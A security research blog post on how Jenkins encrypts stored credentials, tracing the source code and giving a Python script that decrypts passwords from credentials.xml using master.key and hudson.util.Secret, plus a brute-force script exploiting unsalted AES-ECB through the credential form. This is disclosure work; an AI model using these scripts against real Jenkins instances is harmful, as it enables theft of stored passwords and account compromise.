
# Credentials storage in Jenkins
## Introduction
While using Jenkins, I came across the following quirk when modifying a stored credential:


It is rare to still find an application returning some information into the password field to the user. A quick Base-64 decoding did not return anything interesting. Time to dig deeper!

## Files
First, let's check the data directory on the Jenkins instance:

├── credentials.xml
├── secret.key
├── secret.key.not-so-secret
├── secrets
│   ├── hudson.util.Secret
│   ├── master.key
│   └── org.jenkinsci.main.modules.instance_identity.InstanceIdentity.KEY
...

Lots of interesting files with different formats. The file credentials.xml contains:

```xml
<?xml version='1.0' encoding='UTF-8'?>
<com.cloudbees.plugins.credentials.SystemCredentialsProvider plugin="credentials@1.9.4">
  <domainCredentialsMap class="hudson.util.CopyOnWriteMap$Hash">
    <entry>
      <com.cloudbees.plugins.credentials.domains.Domain>
        <specifications/>
      </com.cloudbees.plugins.credentials.domains.Domain>
      <java.util.concurrent.CopyOnWriteArrayList>
        <com.cloudbees.plugins.credentials.impl.UsernamePasswordCredentialsImpl>
          <scope>GLOBAL</scope>
          <id>cd940f20-1697-4052-8b8b-e47c058b5390</id>
          <description></description>
          <username>admin</username>
          <password>VHWeSi8aTjIHIObYWyNw/4hrqydpYESwI1JWfmBQNdI=</password>
        </com.cloudbees.plugins.credentials.impl.UsernamePasswordCredentialsImpl>
      </java.util.concurrent.CopyOnWriteArrayList>
    </entry>
  </domainCredentialsMap>
```

This is the same user and password returned by the application. The UsernamePasswordCredentialsImpl class is going to be our starting point for the code.

## Source code

This class is in fact part of credentials-plugin. There is not much happening there, except:

```java
@DataBoundConstructor
@SuppressWarnings("unused") // by stapler
public UsernamePasswordCredentialsImpl(@CheckForNull CredentialsScope scope,
                                       @CheckForNull String id, @CheckForNull String description,
                                       @CheckForNull String username, @CheckForNull String password) {
    super(scope, id, description);
    this.username = Util.fixNull(username);
    this.password = Secret.fromString(password);
}
```

Now, going to the Jenkins repository to review hudson.utils.Secret and its fromString method:

```
public final class Secret implements Serializable {

  /**
   * Unencrypted secret text.
   */
  private final String value;

  private Secret(String value) {
      this.value = value;
  }
  [...]
  /**
   * Attempts to treat the given string first as a cipher text, and if it doesn't work,
   * treat the given string as the unencrypted secret value.
   *
   */
  public static Secret fromString(String data) {
      data = Util.fixNull(data);
      Secret s = decrypt(data);
      if(s==null) s=new Secret(data);
      return s;
  }
  [...]
    public static final class ConverterImpl implements Converter {

      public void marshal(Object source, HierarchicalStreamWriter writer, MarshallingContext context) {
          Secret src = (Secret) source;
          writer.setValue(src.getEncryptedValue());
      }
  }
```

We can see that the value is in cleartext in the object. It gets encrypted only when the object is serialised. Let's have a look at getEncryptedValue:

```java
public String getEncryptedValue() {
    try {
        Cipher cipher = KEY.encrypt();
        // add the magic suffix which works like a check sum.
        return new String(Base64.encode(cipher.doFinal((value+MAGIC).getBytes("UTF-8"))));
    } catch (GeneralSecurityException e) {
        throw new Error(e); // impossible
    } catch (UnsupportedEncodingException e) {
        throw new Error(e); // impossible
    }
}

private static final String MAGIC = "::::MAGIC::::";

private static final CryptoConfidentialKey KEY = new CryptoConfidentialKey(Secret.class.getName());
```

So the password is concatenated with a magic before being encrypted using KEY. Let's find where that key is coming from and what algorithm is in use. Jumping to CryptoConfidentialKey:

```java
public class CryptoConfidentialKey extends ConfidentialKey {
  private volatile SecretKey secret;
  public CryptoConfidentialKey(String id) {
      super(id);
  }

  public CryptoConfidentialKey(Class owner, String shortName) {
      this(owner.getName()+'.'+shortName);
  }

  private SecretKey getKey() {
      try {
          if (secret==null) {
              synchronized (this) {
                  if (secret==null) {
                      byte[] payload = load();
                      if (payload==null) {
                          payload = ConfidentialStore.get().randomBytes(256);
                          store(payload);
                      }
                      // Due to the stupid US export restriction JDK only ships 128bit version.
                      secret = new SecretKeySpec(payload,0,128/8, ALGORITHM);
                  }
              }
          }
          return secret;
      } catch (IOException e) {
          throw new Error("Failed to load the key: "+getId(),e);
      }
  }

  /**
   * Returns a {@link Cipher} object for encrypting with this key.
   */
  public Cipher encrypt() {
      try {
          Cipher cipher = Secret.getCipher(ALGORITHM);
          cipher.init(Cipher.ENCRYPT_MODE, getKey());
          return cipher;
      } catch (GeneralSecurityException e) {
          throw new AssertionError(e);
      }
  }

  private static final String ALGORITHM = "AES";
}
```

When that class is instantiated, it gets the name of the calling class as parameter. In our case, "hudson.util.Secret". This is exactly the name of one file in the "secrets" directory.

```shell
[root@localhost secrets]# cat hudson.util.Secret | hexdump -C
00000000  de 03 88 1c 89 df 74 7a  3d f0 00 27 dc 9b e1 a3  |......tz=..'....|
00000010  e0 61 1d 99 30 31 91 95  e3 3b 2f 6d 8c a8 1f 4d  |.a..01...;/m...M|
00000020  38 b6 eb 20 13 27 38 e7  5b 93 09 e5 91 04 b8 53  |8.. .'8.[......S|
00000030  df 64 68 75 39 47 3a 2b  2a 17 69 64 ee bc 75 7b  |.dhu9G:+*.id..u{|
00000040  07 5f a1 e9 69 a2 d8 23  9f ad 6b 4d eb db 91 c5  |._..i..#..kM....|
00000050  24 06 6b bc 3c d7 4f 16  e3 ab 95 19 72 f0 75 e7  |$.k.<.O.....r.u.|
00000060  c1 6c 2c 9d 0f 3f 06 99  4e 9f b4 50 12 44 91 1c  |.l,..?..N..P.D..|
00000070  35 78 3c c3 cd 1a 2a 77  6e b5 90 4e 7d eb 3c f6  |5x<...*wn..N}.<.|
00000080  fd c9 53 9e 6f 69 73 02  7b f8 dc 72 f2 60 12 cc  |..S.ois.{..r.`..|
00000090  ae df 4a 10 65 23 bb 34  36 db 7c 38 f0 a6 fc a3  |..J.e#.46.|8....|
000000a0  24 d2 b6 a5 28 b9 58 f8  40 45 0f 83 39 5e da b4  |$...(.X.@E..9^..|
000000b0  5d 93 f0 8f 33 06 bd af  47 b9 d0 b1 ec 26 39 ef  |]...3...G....&9.|
000000c0  53 25 6a d8 ce c6 ec a5  26 5b ee 85 20 df 63 4d  |S%j.....&[.. .cM|
000000d0  f7 f4 94 33 c4 8e 3d 82  ad a9 45 4e be 3e dc 0e  |...3..=...EN.>..|
000000e0  1e d9 49 47 36 3d 38 f3  eb 29 22 22 0c c9 b5 0a  |..IG6=8..)""....|
000000f0  68 a0 e4 0d 0d 5b 99 08  3f 4e 03 8a 70 78 7c a7  |h....[..?N..px|.|
00000100  28 6a a7 93 8b 23 10 54  dd 49 6f f5 67 f4 9c 3c  |(j...#.T.Io.g..<|
00000110
[root@localhost secrets]# wc hudson.util.Secret
  1   7 272 hudson.util.Secret
```

From the source code, it seems that a 256-bytes key is generated but reduced to 128 bits (for U.S. export reason). That is some efficient usage of this scarce resource! The storage of this key, however, uses the payload so we could expect a 256 bytes long file. We are 16 bytes too long.

After going through ConfidentialKey and ConfidentialStore, we end up in DefaultConfidentialStore which contains:

```java
public class DefaultConfidentialStore extends ConfidentialStore {
  private final File rootDir;

  /**
   * The master key.
   *
   * The sole purpose of the master key is to encrypt individual keys on the disk.
   * Because leaking this master key compromises all the individual keys, we must not let
   * this master key used for any other purpose, hence the protected access.
   */
  private final SecretKey masterKey;

  public DefaultConfidentialStore() throws IOException, InterruptedException {
      this(new File(Jenkins.getInstance().getRootDir(),"secrets"));
  }

  public DefaultConfidentialStore(File rootDir) throws IOException, InterruptedException {
      this.rootDir = rootDir;
      if (rootDir.mkdirs()) {
          // protect this directory. but don't change the permission of the existing directory
          // in case the administrator changed this.
          new FilePath(rootDir).chmod(0700);
      }

      TextFile masterSecret = new TextFile(new File(rootDir,"master.key"));
      if (!masterSecret.exists()) {
          // we are only going to use small number of bits (since export control limits AES key length)
          // but let's generate a long enough key anyway
          masterSecret.write(Util.toHexString(randomBytes(128)));
      }
      this.masterKey = Util.toAes128Key(masterSecret.readTrim());
  }

  /**
   * Persists the payload of {@link ConfidentialKey} to the disk.
   */
  @Override
  protected void store(ConfidentialKey key, byte[] payload) throws IOException {
      CipherOutputStream cos=null;
      FileOutputStream fos=null;
      try {
          Cipher sym = Secret.getCipher("AES");
          sym.init(Cipher.ENCRYPT_MODE, masterKey);
          cos = new CipherOutputStream(fos=new FileOutputStream(getFileFor(key)), sym);
          cos.write(payload);
          cos.write(MAGIC);
      } catch (GeneralSecurityException e) {
          throw new IOException("Failed to persist the key: "+key.getId(),e);
      } finally {
          IOUtils.closeQuietly(cos);
          IOUtils.closeQuietly(fos);
      }
  }
```

We know then that a master key (master.key) is used to encrypt the hudson.util.Secret key. Note the use of the magic when storing that intermediate key. This is probably the explanation for the size difference.

Finally, let's check Util.toAes128Key:

```java
public static SecretKey toAes128Key(String s) {
    try {
        // turn secretKey into 256 bit hash
        MessageDigest digest = MessageDigest.getInstance("SHA-256");
        digest.reset();
        digest.update(s.getBytes("UTF-8"));

        // Due to the stupid US export restriction JDK only ships 128bit version.
        return new SecretKeySpec(digest.digest(),0,128/8, "AES");
    } catch (NoSuchAlgorithmException e) {
        throw new Error(e);
    } catch (UnsupportedEncodingException e) {
        throw new Error(e);
    }
}
```

Since encrypting the key with a master key was not enough, it is also using a hashing of the master key, just in case.

## Decryption script
Here is my master.key file:

```
6fa18d9aaac920b016d119b76de75251f472ec6f44734533d64eeb5de794f1ca33108a7a7c853a3acf084184e3e93ff98484d668a32d16f810cce970f93c750da0b785cb25527384acab38015c1a3e180a342b807f724da01f3e94584ac60651dc7f1958f3e2c6ed1a16990cbbcc361c82e3b65e96f435173ea67b7255d6810f
```

which is different from the binary format of hudson.util.Secret. I initially tried to unhexlify the content, before realising that it was used as-is.

So here is the first part to decrypt the intermediate key, using the master.key:

```
hashed_master_key = sha256(master_key).digest()[:16] # truncate to emulate toAes128Key
hudson_secret_key = open("hudson.util.Secret").read()

o = AES.new(hashed_master_key, AES.MODE_ECB)
x = o.decrypt(hudson_secret_key)
assert magic in x
And now to decrypt our password:

k = x[:-16] # remove the MAGIC
k = k[:16]  # truncate to emulate toAes128Key

password = base64.decodestring("VHWeSi8aTjIHIObYWyNw/4hrqydpYESwI1JWfmBQNdI=")
o = AES.new(k, AES.MODE_ECB)
x = o.decrypt(password)
assert magic in x
print x
```

When run:

```shell
[tweek@sec0 jenkins]$ ./decrypt.py | hexdump -C
00000000  70 61 73 73 77 6f 72 64  3a 3a 3a 3a 4d 41 47 49  |password::::MAGI|
00000010  43 3a 3a 3a 3a 0b 0b 0b  0b 0b 0b 0b 0b 0b 0b 0b  |C::::...........|
00000020  0a                                                |.|
00000021
```

## Conclusion
As we have seen, Jenkins uses the master.key to encrypt the key hudson.util.Secret. This key is then used to encrypt the password in credentials.xml. AES-128-ECB is used for all encryptions.

From there, there are two attacks to consider:

With file access to a Jenkins instance, grab secrets/* and credentials.xml. Using this script, you will be able to retrieve all the stored passwords.
An online brute force attack is possible. Since the passwords are not salted, two passwords will have the same encrypted image. To test if the encrypted password matches a test password, one could add a credential with the test password and compare the encrypted value with the encrypted unknown password.

## Extras

It is also possible for an attacker to deduce a range for the length of the password. If the encrypted value is one block long (16 bytes), then it means the password length is 16 - len(magic) - 1 = 3 at most. The -1 reflects that if the string is exactly 16 bytes long, an extra padding block will be generated. In the same idea, if the encrypted password is 32 bytes long, the length of the original password will be between 3 and 18 bytes, etc.

Since the encryption is using ECB mode, it is possible to optimise the brute force attack by submitting multiple test passwords in one form validation. To do so, one needs to format the password with the magic suffix and expected padding. In this case, we will not be able to test a password whose length implies a padding with \x0a or \x0d (as it will be interpreted as a new line). So, passwords of length 6 and 9 are out for now. Here is a python script to generate such payloads, based on John's passwords.lst:

```python
#!/usr/bin/env python

import struct

def pkcs7(s, l):
  p = l - (len(s) % l)
  return s + struct.pack('B', p) * p

def magic_and_pad(x):
  p = pkcs7(x + "::::MAGIC::::", 32)
  assert len(p) == 32
  return p

def chunks(l, n):
  for i in xrange(0, len(l), n):
    yield l[i:i+n]

pwds = open("password.lst").read().splitlines()
pwds = [ x for x in pwds if len(x) not in [6,9] and len(x)<18 ]
padded_pwds = [ magic_and_pad(x) for x in pwds ]

cks = chunks(padded_pwds, 2048)
payloads["jenkins_pwds"] = [ e("".join(ipwds)) for ipwds in cks ]
With a bit of Burst magic:

# This is the encrypted password we want to match
target = d64("xBAR539h6d4GA5YZNy1foPoNRXnGR/4VaDrvW/4hydg=")

# Use the passwords list we generated
irs_post = i(r1, at="HERE", payloads="jenkins_pwds", pre_func=lambda x:x)

# We need to do another GET to retrieve the result of the encryption
irs_get = RequestSet([r0.copy() for i in range(len(irs_post))])

# Interleave the POST and GET requests
# See itertools roundrobin recipe
irs = RequestSet(list(roundrobin(irs_post, irs_get)))

# Run them
irs()

# Regex to retrieve the encrypted password from the response
ex = re.compile(r'<input name="_.password" value="(.*?)"')

# Extract and concatenate all the encrypted passwords
# [:-16] is here to drop the legitimate padding for the final block
encrypted_passwords = "".join([ d64(ex.findall(a.response.content)[0])[:-16] for a in irs_get ])

ipwd = encrypted_passwords.index(target)/32
print pwds[ipwd]
```

With the default Jetty parameter length limit, up to 2048 passwords can be tested per request!
